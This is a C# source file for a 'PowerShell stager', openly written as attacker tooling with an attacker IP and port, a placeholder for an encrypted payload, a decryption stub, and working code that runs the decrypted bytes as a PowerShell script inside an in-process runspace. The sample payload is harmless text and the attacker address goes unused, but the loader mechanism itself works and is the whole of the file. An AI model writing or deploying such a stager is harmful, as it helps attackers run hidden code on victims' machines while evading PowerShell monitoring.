//manual compile: csc /reference:/opt/microsoft/powershell/7/System.Management.Automation.dll,/usr/lib/mono/4.5.1-api/Facades/System.Runtime.dll /out:Stager.dll Stager.cs 

using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

namespace PowerShellStager
{
    class Program
    {
        static void Main(string[] args)
        {
            // attacker configuration
            string attackerIP = "192.168.1.1";
            int attackerPort = 4444;

            // embedded and encrypted payload (replace with your encrypted payload)
            byte[] encryptedPayload = { 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x2C, 0x20, 0x57, 0x6F, 0x72, 0x6C, 0x64 };

            // decrypt and execute the payload
            try
            {
                byte[] decryptedPayload = DecryptPayload(encryptedPayload);
                ExecutePayload(decryptedPayload);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to decrypt and execute payload: {ex.Message}");
            }
        }

        static byte[] DecryptPayload(byte[] encryptedPayload)
        {
            // implement your decryption algorithm here
            // example:
            // byte[] decryptedPayload = new byte[encryptedPayload.Length];
            // for (int i = 0; i < encryptedPayload.Length; i++)
            // {
            //     decryptedPayload[i] = (byte)(encryptedPayload[i] ^ 0xFF);
            // }
            // return decryptedPayload;

            // for demonstration purposes, return the encrypted payload as-is
            return encryptedPayload;
        }

        static void ExecutePayload(byte[] payload)
        {
            // convert byte array to PowerShell script
            string script = Encoding.ASCII.GetString(payload);

            // preate a powerShell runspace
            using (Runspace runspace = RunspaceFactory.CreateRunspace())
            {
                runspace.Open();

                // create a pipeline and feed the script into it
                Pipeline pipeline = runspace.CreatePipeline();
                pipeline.Commands.AddScript(script);

                // execute the script
                try
                {
                    pipeline.Invoke();
                    Console.WriteLine("Payload executed successfully.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Failed to execute payload");
                }
            }
        }
    }
}
